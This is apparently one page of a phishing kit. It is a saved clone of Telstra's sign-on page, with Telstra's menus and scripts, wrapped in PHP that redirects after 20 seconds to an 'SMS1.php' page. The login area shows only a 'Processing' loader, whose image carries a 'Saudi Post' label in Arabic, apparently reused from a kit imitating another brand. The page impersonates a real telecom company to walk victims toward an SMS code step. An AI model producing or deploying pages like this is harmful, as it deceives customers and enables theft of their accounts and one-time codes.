...
if($id == 1){
    header("refresh:20; url=SMS1.php");
}else{
    if($id == 2){
...
?>
<!DOCTYPE html>
<html data-cbscriptallow="true" style="" class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths js-nav-translate"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><script async="" data-jsonpid="" src="./Telstra Login1_files/nlsSDK600.bundle.min.js"></script><script type="text/javascript" id="www-widgetapi-script" src="./Telstra Login1_files/www-widgetapi.js" async=""></script><script async="" src="./Telstra Login1_files/config250.js"></script><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-block-transitions{transition:0s all!important;-webkit-transition:0s all!important;}.ng-hide-add-active,.ng-hide-remove{display:block!important;}</style>
    ...
    <link rel="stylesheet" href="./Telstra Login1_files/font-woff.css"><script src="./Telstra Login1_files/touch.js"></script><script type="text/javascript" async="" src="./Telstra Login1_files/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-yF7E1ktGfbA26NWZZupkIgKSvH2WmFG90KyY3BzFp06blZkjALcng9gGnuW5hlae"></script><script type="text/javascript">
      ...
      <script src="./Telstra Login1_files/api.js"></script> 
    ...
    <link rel="stylesheet" href="./Telstra Login1_files/bootstrap-responsive.css" type="text/css" media="all">
    <link rel="stylesheet" href="./Telstra Login1_files/styles-responsive.css" type="text/css" media="all">
    <link rel="stylesheet" href="./Telstra Login1_files/aem-global-responsive.css" type="text/css" media="all">
    <!--[if lte IE 9]>
    <link href="https://www.telstra.com.au/etc/designs/tcom/tcom-core/css/styles-responsive-ie.css" rel="stylesheet" media="all">
    <![endif]-->
    <link rel="stylesheet" href="./Telstra Login1_files/styles-print.css" media="print">
    <link rel="stylesheet" href="./Telstra Login1_files/service-qualifier.css" type="text/css">

    <!-- Overlay headInclude.jsp to include additional scripts in page header -->
    <script src="./Telstra Login1_files/modernizr.js"></script>

    <!--Line below to include telstra-auth.csss only in IE browsers above 9 and all other browsers -->
    <!--[if gt IE 9]><!-->
    <link rel="stylesheet" href="./Telstra Login1_files/telstra-auth.css">
    <!--<![endif]-->
...
<script type="text/javascript" src="./Telstra Login1_files/common.min.js" async=""></script><script type="text/javascript" src="./Telstra Login1_files/adobetags.min.js"></script><script type="text/javascript" src="./Telstra Login1_files/signon.min.js" async=""></script></head>
<body role="document" class="base-blue  white-bkg" cz-shortcut-listen="true"><iframe src="./Telstra Login1_files/storageframe.html" id="LOCSTORAGE" scrolling="no" name="empty" hidden="true" style="width: 1px; height: 1px; position: absolute; top: -7px; left: -7px; border: 0px;"></iframe>
    ...
    <div class="parbase clientcontext">
        <script type="text/javascript" src="./Telstra Login1_files/jquery.js"></script>
        <script type="text/javascript" src="./Telstra Login1_files/utils.js"></script>
        <script type="text/javascript" src="./Telstra Login1_files/granite.js"></script>
        <script type="text/javascript" src="./Telstra Login1_files/jquery(1).js"></script>
        <script type="text/javascript" src="./Telstra Login1_files/shared.js"></script>
        <script type="text/javascript" src="./Telstra Login1_files/underscore.js"></script>
        <script type="text/javascript" src="./Telstra Login1_files/kernel.js"></script>
    </div>
    ...
    <header class="hide-header">
        ...
        <div class="visible-xs" style="height:100px;">
            <img class="img-spectrum visible-xs" src="./Telstra Login1_files/3.0-spectrum-gradient-blue.png" alt="">
        </div>
    </header>
            ...
            <div class="nav-inner">
                <span class="site-logo is-small"><span class="vh">Telstra.com</span></span>
                        ...
                        <li class="is-expanded is-active">
                            ...
                            <ul>
                                <li>
                                    ...
                                    <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Personal</a></div><a href="https://www.telstra.com.au/tv-movies-music" class="parent-link has-icon"><i class="td-icon icon-foxtel"></i>TV, Movies &amp; Music</a>
                                        <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Personal</a></div>
                                        ...
                                        <ul>
                                            <li>
                                                ...
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div><a href="https://www.telstra.com.au/tv-movies-music/products" class="parent-link">Products</a>
                                                    <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div>
                                            ...
                                            <li>
                                                ...
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div><a href="https://www.telstra.com.au/tv-movies-music/sport" class="parent-link">Sport</a>
                                                    <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div>
                                            ...
                                            <li>
                                                ...
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div><a href="https://www.telstra.com.au/tv-movies-music/telstra-tv" class="parent-link">Telstra TV</a>
                                                    <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div>
                                            ...
                                            <li>
                                                ...
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div><a href="https://www.telstra.com.au/tv-movies-music/why-foxtel-from-telstra" class="parent-link">Foxtel From Telstra</a>
                                                    <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div>
                                                    ...
                                                    <ul>
                                                        <li>
                                                            ...
                                                            <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Foxtel From Telstra</a></div><a href="https://www.telstra.com.au/tv-movies-music/why-foxtel-from-telstra/foxtel-channel-packs" class="parent-link">Channel Packs</a>
                                                                <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Foxtel From Telstra</a></div>
                                            ...
                                            <li>
                                                ...
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div><a href="https://www.telstra.com.au/tv-movies-music/foxtel-from-telstra" class="parent-link">Foxtel Packages</a>
                                                    <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to TV, Movies &amp; Music</a></div>
                                                    ...
                                                    <ul>
                                                        <li>
                                                            ...
                                                            <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Foxtel Packages</a></div><a href="https://www.telstra.com.au/tv-movies-music/foxtel-from-telstra/foxtel-channel-packs" class="parent-link">Channel Packs</a>
                                                                <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Foxtel Packages</a></div>
                                ...
                                <li>
                                    ...
                                    <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Personal</a></div><a href="https://www.telstra.com.au/mobile-phones" class="parent-link has-icon"><i class="td-icon icon-mobile"></i>Mobile Phones</a>
                                        <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Personal</a></div>
                                        ...
                                        <ul>
                                            ...
                                            <li>
                                                ...
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Mobile Phones</a></div><a href="https://www.telstra.com.au/mobile-phones/plans-and-rates" class="parent-link">Plans and rates</a>
                                                    <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Mobile Phones</a></div>
                                            ...
                                            <li>
                                                ...
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Mobile Phones</a></div><a href="https://www.telstra.com.au/mobile-phones/prepaid-mobiles" class="parent-link">Pre-Paid mobiles</a>
                                                    <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Mobile Phones</a></div>
                                            ...
                                            <li>
                                                ...
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Mobile Phones</a></div><a href="https://www.telstra.com.au/mobile-phones/moreonyourmobile" class="parent-link">More on your mobile</a>
                                                    <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Mobile Phones</a></div>
                                ...
                                <li>
                                    ...
                                    <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Personal</a></div><a href="https://www.telstra.com.au/tablets" class="parent-link has-icon"><i class="td-icon icon-tablet"></i>Tablets</a>
                                        <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Personal</a></div>
                                        ...
                                        <ul>
                                            <li>
                                                ...
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Tablets</a></div><a href="https://www.telstra.com.au/tablets/tablets-on-a-plan" class="parent-link">Tablets and Plans</a>
                                                    <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Tablets</a></div>
                                ...
                                <li>
                                    ...
                                    <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Personal</a></div><a href="https://www.telstra.com.au/broadband" class="parent-link has-icon"><i class="td-icon icon-internet"></i>Broadband</a>
                                        <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Personal</a></div>
                                        ...
                                        <ul>
                                            ...
                                            <li>
                                                ...
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Broadband</a></div><a href="https://www.telstra.com.au/broadband/mobile-broadband" class="parent-link">Mobile broadband</a>
                                                    <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Broadband</a></div>
                                            ...
                                            <li>
                                                ...
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Broadband</a></div><a href="https://www.telstra.com.au/broadband/extras" class="parent-link">Extras</a>
                                                    <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Broadband</a></div>
                                            ...
                                            <li>
                                                ...
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Broadband</a></div><a href="https://www.telstra.com.au/broadband/nbn" class="parent-link">nbn</a>
                                                    <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Broadband</a></div>
                                            ...
                                            <li>
                                                ...
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Broadband</a></div><a href="https://www.telstra.com.au/broadband/telstra-air" class="parent-link">Telstra Air</a>
                                                    <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Broadband</a></div>
                                ...
                                <li>
                                    ...
                                    <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Personal</a></div><a href="https://www.telstra.com.au/bundles" class="parent-link has-icon"><i class="td-icon icon-bundle"></i>Bundles</a>
                                        <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Personal</a></div>
                                ...
                                <li>
                                    ...
                                    <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Personal</a></div><a href="https://www.telstra.com.au/home-phone" class="parent-link has-icon"><i class="td-icon icon-phone"></i>Home Phone</a>
                                        <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Personal</a></div>
                                        ...
                                        <ul>
                                            ...
                                            <li>
                                                ...
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Home Phone</a></div><a href="https://www.telstra.com.au/home-phone/features-services" class="parent-link">Features &amp; services</a>
                                                    <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Home Phone</a></div>
                                            ...
                                            <li>
                                                ...
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Home Phone</a></div><a href="https://www.telstra.com.au/home-phone/international-calling" class="parent-link">International calling</a>
                                                    <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Home Phone</a></div>
                                ...
                                <li>
                                    ...
                                    <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Personal</a></div><a href="https://www.telstra.com.au/connectedhome" class="parent-link has-icon"><i class="td-icon icon-tv-clear"></i>Connected Home</a>
                                        <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Personal</a></div>
                                        ...
                                        <ul>
                                            <li>
                                                ...
                                                <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Connected Home</a></div><a href="https://www.telstra.com.au/connectedhome/enhancements" class="parent-link">Enhancements</a>
                                                    <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Connected Home</a></div>
                    ...
                    <li>
                        ...
                        <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Personal</a></div><a target="_self" href="https://www.telstra.com.au/support" class="parent-link"> Support </a>
                            <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to </a></div>
                    ...
                    <li>
                        ...
                        <div class="children" tabindex="-1"><div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to Personal</a></div><a target="_self" href="https://www.my.telstra.com.au/myaccount/home" class="parent-link"> My Account </a>
                            <div class="back-to-parent-container"><a href="https://signon.telstra.com.au/login#" class="back-to-parent">Back to </a></div>
    ...
    <div class="ps-scrollbar-x-rail" style="width: 290px; left: 0px; bottom: 3px;"><div class="ps-scrollbar-x" style="left: 0px; width: 0px;"></div></div><div class="ps-scrollbar-y-rail" style="top: 0px; height: 606px; right: 8px;"><div class="ps-scrollbar-y" style="top: 0px; height: 0px;"></div></div></div>
                    ...
                    <div class="standard row content col-100">
                        <div class="col col-100-c0 first last" style="min-height:418px;">
                            <div class="rebrandloginHeadingDiv">
                                <span class="heading rebrandLoginheading rebrandHeadingFont">Processing  ...  </span>
                            </div>
                                    ...
                                    <div class="col col-50-50-c0 first rebrandColumn1" style="padding: 0px; min-height:418px;">
                                        <div class="col-wrapper" style="padding: 0px; margin-right: 28px; min-height:418px;">
                                            <div style="padding: 0px; margin-left: 30px; margin-top: 30px;">
                                                <form method="post" id="Login" name="Login" class="form" action="https://signon.telstra.com.au/login" style="margin: 0px;">
                                                    <input type="hidden" name="goto" value="https://media.telstra.com.au/">
                                                   
                                                        
                                                   
                                                        <p id="unametip" hidden="" style="width: 100%; font-size: 12px; display: block;">.</p>
                                                        <div class="cl-forgot-frame-wrap iframeFun" hidden="">
                                                            <a href="https://signon.telstra.com.au/login#"><i class="td-icon-sm icon-ui-up-arrow-thick"></i></a>
                                                            <!-- <iframe class="cl-forgot-frame" width="100%" scrolling="no" frameborder="0" height="470"> -->
                                                            <iframe id="iframeForgotUsername" class="cl-forgot-frame" style="width:100%;border:none;" src="./Telstra Login1_files/saved_resource.html">    
                                                                <p>Your browser does not support iframes.</p>
                                                            </iframe>
                                                        </div>
                                                        <div class="input-wrapper field-group">
                                                            
                                                            <div id="page-loader" class="d-flex align-items-center justify-content-center">
        <div>
            <img src="data:image/png;base64," alt="البريد السعودي" class="loader" />
            <img style=" margin-right: -40px;margin-left: -130px;" src="loader-1.svg" width="140" height="" />
        </div>
    </div>
                                                        </div>
                                                        <div class="cl-forgot-frame-wrap iframeFpw" hidden="">
                                                            <a href="https://signon.telstra.com.au/login#"><i class="td-icon-sm icon-ui-up-arrow-thick"></i></a>
                                                            <iframe id="iframeForgotPassword" class="cl-forgot-frame" style="width:100%;border:none;" src="./Telstra Login1_files/saved_resource(1).html">
                                                                <p>Your browser does not support iframes.</p>
                                                            </iframe>
                                                        </div>
                                                        ...
                                                        <p id="busidtip" hidden="" style="width: 90%; font-size: 12px; display: none;">For example: tb123456</p>
                                                        
                                                        
                                                     
                                                         
                                                        <div class="field-group checkbox no-main-label input-wrapper" style="margin-top: 5px;">
                                                            <label class="inline left rebrandTextFont" for="rememberMe"hidden>
                                                                <input type="checkbox" name="rememberMe" id="rememberMe" value="true" hidden>
                                                            </label>
    ...
    <script>
        window.onmessage = (e) => {
          if (e.data.hasOwnProperty("frameHeight")) {
            hu = e.data.frameHeight + 30;
            document.getElementById("iframeForgotUsername").style.height = hu + "px";  
          }
          if (e.data.hasOwnProperty("frameHeightPWD")) {
            hp = e.data.frameHeightPWD + 30;
            document.getElementById("iframeForgotPassword").style.height = hp + "px";
          }
        };
    </script>
            ...
            <div id="scrollup" class="affix-top">
                <div class="container">
                  <div class="scrollup-outer">
                    <a href="https://signon.telstra.com.au/login#top"><div class="scrollup">Back to top</div></a>
                  </div>
                </div>
            </div>
                    ...
                    <div class="col first col-25-25-25-25-c0 hidden-xs">
                        <div class="col-wrapper">
                          <ul class="social-icons">
                            <li><a href="https://www.facebook.com/Telstra24x7" aria-label="Facebook Telstra"><span class="social-icon facebook td-icon icon-facebook text-theme"></span></a></li>
                            <li><a href="https://twitter.com/telstra" aria-label="Twitter Telstra"><span class="social-icon twitter td-icon icon-twitter text-theme"></span></a></li>
                            <li><a href="https://www.youtube.com/user/TelstraCorp" aria-label="YouTube Telstra"><span class="social-icon youtube td-icon icon-youtube text-theme"></span></a></li>
                            <li><a href="https://plus.google.com/+Telstra" aria-label="Google Plus Telstra"><span class="social-icon google td-icon icon-google-plus text-theme"></span></a></li>
                          </ul>
                          <!-- 
                          <script type="text/javascript">
                    ...
                    <div class="col first col-25-25-25-25-c0 visible-xs">
                        <div class="col-wrapper">
                            <ul class="social-icons">
                                <li><a href="https://www.facebook.com/Telstra24x7" aria-label="Facebook Telstra"><span class="social-icon facebook td-icon icon-facebook text-theme"></span></a></li>
                                <li><a href="https://twitter.com/telstra" aria-label="Twitter Telstra"><span class="social-icon twitter td-icon icon-twitter text-theme"></span></a></li>
                                <li><a href="http://www.youtube.com/user/TelstraCorp" aria-label="YouTube Telstra"><span class="social-icon youtube td-icon icon-youtube text-theme"></span></a></li>
                                <li><a href="https://plus.google.com/+Telstra" aria-label="Google Plus Telstra"><span class="social-icon google td-icon icon-google-plus text-theme"></span></a></li>
                            </ul>
                            <!--  
                            <script>
    ...
    <script>
        var funURL = "https://signon.telstra.com.au/forgotten-username.jsp?goto=https://media.telstra.com.au/";
        var fpwURL = "https://signon.telstra.com.au/forgotten-password.jsp?goto=https://media.telstra.com.au/";
        var funStandaloneURL = "https://id.telstra.com.au/forgotten/username/standalone?goto=https://media.telstra.com.au/";
        var fpwStandaloneURL = "https://id.telstra.com.au/forgotten/password/standalone?goto=https://media.telstra.com.au/";
    </script>

    <script type="text/javascript" src="./Telstra Login1_files/jquery-1.11.1.min.js"></script>
    <script type="text/javascript" src="./Telstra Login1_files/jquery.validate.min.js"></script>
    <script type="text/javascript" src="./Telstra Login1_files/angular.min.js"></script>
    <script type="text/javascript" src="./Telstra Login1_files/angular-route.min.js"></script>
    <script type="text/javascript" src="./Telstra Login1_files/angular-sanitize.min.js"></script>
    <script type="text/javascript" src="./Telstra Login1_files/angular-resource.min.js"></script>
    <script type="text/javascript" src="./Telstra Login1_files/jquery.placeholder.js"></script>
    <script type="text/javascript" src="./Telstra Login1_files/underscore.min.js"></script>
    <script type="text/javascript" src="./Telstra Login1_files/handlebars-v2.0.0.js"></script>
    <script type="text/javascript" src="./Telstra Login1_files/dropdown.js"></script>
    <script type="text/javascript" src="./Telstra Login1_files/bootstrap-hover-dropdown.js"></script>
    <script type="text/javascript" src="./Telstra Login1_files/iframeResizer.js"></script>
    <script type="text/javascript" src="./Telstra Login1_files/tooltips.js"></script>
    <script type="text/javascript" src="./Telstra Login1_files/main.js"></script>
    ...
    <script src="./Telstra Login1_files/jquery(2).js"></script>
    <script type="text/javascript" src="./Telstra Login1_files/analytics.js"></script>
    <script src="./Telstra Login1_files/global.js"></script>
    ...
    <script type="text/javascript" src="./Telstra Login1_files/footer.js"></script>   
    ...
    </script><script type="text/javascript" src="./Telstra Login1_files/v52.js"></script><noscript><img src="https://secure-au.imrworldwide.com/cgi-bin/m?ci=bigpond&amp;cg=0" alt=""/></noscript>
    ...
    <!-- END Nielsen//NetRatings SiteCensus V5.2 -->
                        ...
                        </div><div class="shade-bg">&nbsp;</div><iframe src="./Telstra Login1_files/ls.html" height="0" width="0" id="lsframe" style="display: none;"></iframe><iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_telstra_0" name="destination_publishing_iframe_telstra_0_name" src="./Telstra Login1_files/dest5.html" class="aamIframeLoaded" style="display: none; width: 0px; height: 0px;"></iframe><div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div><div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div><div style="z-index: 2000000000; position: relative;"><iframe title="recaptcha challenge expires in two minutes" src="./Telstra Login1_files/bframe.html" name="c-9rlx2pvqry9r" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" style="width: 100%; height: 100%;"></iframe></div></div></body></html>